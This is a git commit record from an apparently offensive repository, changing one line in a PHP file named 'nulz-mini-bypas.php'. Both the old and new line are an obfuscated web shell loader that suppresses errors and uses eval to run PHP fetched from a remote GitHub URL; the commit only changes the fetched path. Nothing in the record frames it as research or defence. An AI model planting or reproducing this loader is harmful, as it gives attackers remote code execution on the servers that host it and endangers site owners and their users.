567d6f77dd0f81bb883f56006081c0131613c0a0
NuLz <129581037+haxorstars@users.noreply.github.com>
2024-02-11 18:13:10 +0700

    NuLz

--- nulz-mini/nulz-mini-bypas.php
+++ nulz-mini/nulz-mini-bypas.php
@@ -1,1 +1,1 @@
-<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/haxorstars/archive/main/nulz/nulz.mini.php"))/******/ /*By NuLz404*/?>
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/haxorstars/archive/main/nulz-mini/nulz.mini.php"))/******/ /*By NuLz404*/?>
